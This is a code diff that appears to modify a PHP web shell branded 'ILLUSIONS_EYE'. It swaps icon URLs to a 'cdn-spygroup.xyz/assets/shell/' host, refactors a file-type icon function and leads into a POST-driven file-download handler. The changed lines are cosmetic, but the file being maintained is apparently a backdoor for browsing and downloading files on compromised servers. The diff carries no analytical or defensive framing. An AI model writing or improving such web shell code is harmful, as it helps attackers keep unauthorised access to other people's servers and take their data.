@@ -1229,7 +1229,7 @@ function showAnimation($name){
 }
 function __showicon($r){
 	$s['btn']='https://cdn-spygroup.xyz/assets/shell/iconeye.png';
-	$s['ILLUSIONS_EYEmini']='http://solevisible.com/images/ILLUSIONS_EYEmini.png';
+	$s['ILLUSIONS_EYEmini']='https://cdn-spygroup.xyz/assets/shell/godseye.webp';
 	$s['loader']='https://cdn-spygroup.xyz/assets/shell/loader2.webp';
 	//return 'data:image/png;base64,'.__get_resource($s[$r]);
 	return $s[$r];
@@ -3219,18 +3219,38 @@ break;
 echo '</div>';
 ILLUSIONS_EYEFooter();
 }
-function findicon($file,$type){
-$s = 'http://solevisible.com/icons/';
-$types = array('json','ppt','pptx','xls','xlsx','msi','config','cgi','pm','c','cpp','cs','java','aspx','asp','db','ttf','eot','woff','woff2','woff','conf','log','apk','cab','bz2','tgz','dmg','izo','jar','7z','iso','rar','bat','sh','ILLUSIONS_EYE','gz','tar','php','php4','php5','phtml','html','xhtml','shtml','htm','zip','png','jpg','jpeg','gif','bmp','ico','txt','js','rb','py','xml','css','sql','htaccess','pl','ini','dll','exe','mp3','mp4','m4a','mov','flv','swf','mkv','avi','wmv','mpg','mpeg','dat','pdf','3gp','doc','docx','docm');
-if($type!='file'){
-return ($file=='..'?$s.'back.png':$s.'folder.png');
-}else{
-$ext = explode('.',$file);
-$ext = end($ext);
-$ext = strtolower($ext);
-return (in_array($ext,$types)?$s.$ext.'.png':$s.'notfound.png');
+function findicon($file, $type)
+{
+    $baseUrl = 'https://solevisible.com/icons/';
+
+    $types = [
+        'json', 'ppt', 'pptx', 'xls', 'xlsx', 'msi', 'config',
+        'cgi', 'pm', 'c', 'cpp', 'cs', 'java', 'aspx', 'asp',
+        'db', 'ttf', 'eot', 'woff', 'woff2', 'conf', 'log',
+        'apk', 'cab', 'bz2', 'tgz', 'dmg', 'izo', 'jar', '7z',
+        'iso', 'rar', 'bat', 'sh', 'illusions_eye', 'gz', 'tar',
+        'php', 'php4', 'php5', 'phtml', 'html', 'xhtml', 'shtml',
+        'htm', 'zip', 'png', 'jpg', 'jpeg', 'gif', 'bmp', 'ico',
+        'txt', 'js', 'rb', 'py', 'xml', 'css', 'sql', 'htaccess',
+        'pl', 'ini', 'dll', 'exe', 'mp3', 'mp4', 'm4a', 'mov',
+        'flv', 'swf', 'mkv', 'avi', 'wmv', 'mpg', 'mpeg', 'dat',
+        'pdf', '3gp', 'doc', 'docx', 'docm'
+    ];
+
+    if ($type !== 'file') {
+        return $file === '..'
+            ? $baseUrl . 'back.png'
+            : $baseUrl . 'menu/folder2.svg';
+    }
+
+    // Ambil ekstensi file
+    $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
+
+    return in_array($ext, $types, true)
+        ? $baseUrl . $ext . '.png'
+        : $baseUrl . 'notfound.png';
 }
-}
+
 function ILLUSIONS_EYEdlfile(){
 if(isset($_POST['c'],$_POST['file'])){
 $basename = rawurldecode(basename($_POST['file']));
